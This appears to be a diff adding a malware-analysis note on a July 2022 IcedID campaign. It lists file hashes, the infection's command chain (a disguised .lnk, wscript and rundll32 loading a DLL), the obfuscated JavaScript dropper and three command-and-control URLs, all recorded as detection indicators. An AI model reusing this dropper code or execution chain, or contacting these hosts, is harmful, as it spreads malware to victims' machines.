@@ -1,0 +1,44 @@
+IcedID | 25.07.2022 | Campaign 801015007
+
+***************************************
+
+.iso fac078655a3f20ac3d4f4119c0b6b1ad25b3fa4de49c7b30dac9f1fac7a47853
+.dll 77c3de1c2a5ced907159777ff648c2a1f3c4bdb8b6a9fbc9d06c76d8e6cb2c8d
+
+***************************************
+
+Exec >>
+
+cmd /c C:\Users\Admin\AppData\Local\Temp\LoanStatus_07_25_22pdf.lnk
+
+cmd /c C:\Users\Admin\AppData\Local\Temp\here\AmO7Koa.cmd
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\here\aSR0li1t.js
+
+rundll32.exe C:\Users\Admin\AppData\Local\Temp\here\qIfRtTz.dat,#1
+
+***************************************
+
+.js file content 
+
+/**
+	nktHiTp
+*/
+function reverse(s)
+{
+	return s.split("").reverse().join("");
+}
+
+var args = reverse(WScript.Arguments(0) + WScript.Arguments(1));
+
+WScript.createObject("wscript.shell").run(args + " here/qIfRtTz.dat,#1");
+
+***************************************
+
+c2's
+
+http://eventbloodd.com/
+http://uytricmpreprom.com/news/
+http://plorinnoult.com/news/
+
+***************************************
